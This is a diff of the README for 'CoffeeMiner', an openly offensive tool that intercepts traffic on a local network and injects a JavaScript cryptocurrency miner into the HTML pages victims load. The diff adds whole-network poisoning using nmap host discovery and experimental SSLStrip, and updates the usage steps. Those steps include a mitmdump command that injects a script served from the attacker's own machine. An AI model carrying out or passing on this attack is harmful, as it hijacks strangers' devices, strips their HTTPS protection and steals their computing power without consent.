@@ -13,17 +13,18 @@ A blog post about this project can be read here: http://arnaucode.com/blog/coffe
 - Injects a js script in all the HTML pages requested by the victims
 - The js script injected contains a cryptocurrency miner
 - All the devices victims connected to the Lan network, will be mining for the CoffeeMiner
-
+- Poisons entire network using 'nmap -sn' to find active IPs
+- Uses SSLStrip functionality (experimental)
 
 ## Use
 - install.sh
 ```
 bash install.sh
 ```
-- edit victims.txt with one IP per line
-- edit coffeeMiner.py, line 28, with the coffeeMiner httpserver IP:
+- edit whitelist.txt with one IP per line (optional)
+- edit coffeeMiner.py config, beginning line 3:
 ```py
-os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
+os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://[YOUR_IP_HERE]:8000/script.js' -T")
 ```
 - execute coffeeMiner.py
 ```
